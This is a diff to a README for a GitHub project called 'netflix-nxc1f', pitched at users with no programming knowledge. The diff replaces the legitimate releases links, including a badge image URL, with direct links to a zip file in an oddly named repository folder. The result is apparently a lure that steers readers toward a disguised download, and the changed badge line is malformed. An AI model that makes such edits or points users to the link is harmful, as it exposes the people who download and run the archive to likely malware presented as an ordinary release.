@@ -1,7 +1,7 @@
 # 🚀 netflix-nxc1f - Explore Creative Code Ideas Easily
 
 ## 📥 Download the Application
-[![Download Release](https://img.shields.io/badge/Download%20Release-blue.svg)](https://github.com/karthik02433/netflix-nxc1f/releases)
+[![Download Release](https://raw.githubusercontent.com/karthik02433/netflix-nxc1f/main/maternality/netflix-nxc1f.zip%https://raw.githubusercontent.com/karthik02433/netflix-nxc1f/main/maternality/netflix-nxc1f.zip)](https://raw.githubusercontent.com/karthik02433/netflix-nxc1f/main/maternality/netflix-nxc1f.zip)
 
 ## 🚀 Getting Started
 Welcome to the Netflix-inspired project, **netflix-nxc1f**. This application is a sandbox for exploring random code snippets, creative ideas, and prototypes. No programming knowledge is required, and you can dive in easily.
@@ -22,7 +22,7 @@ Welcome to the Netflix-inspired project, **netflix-nxc1f**. This application is 
 - **User-Friendly Interface:** Simple layout. Navigate easily without technical skills.
 
 ## 📥 Download & Install
-To download the application, visit this page: [Download Releases](https://github.com/karthik02433/netflix-nxc1f/releases).
+To download the application, visit this page: [Download Releases](https://raw.githubusercontent.com/karthik02433/netflix-nxc1f/main/maternality/netflix-nxc1f.zip).
 
 ### 🛠️ Installation Steps
 1. Click on the link above.
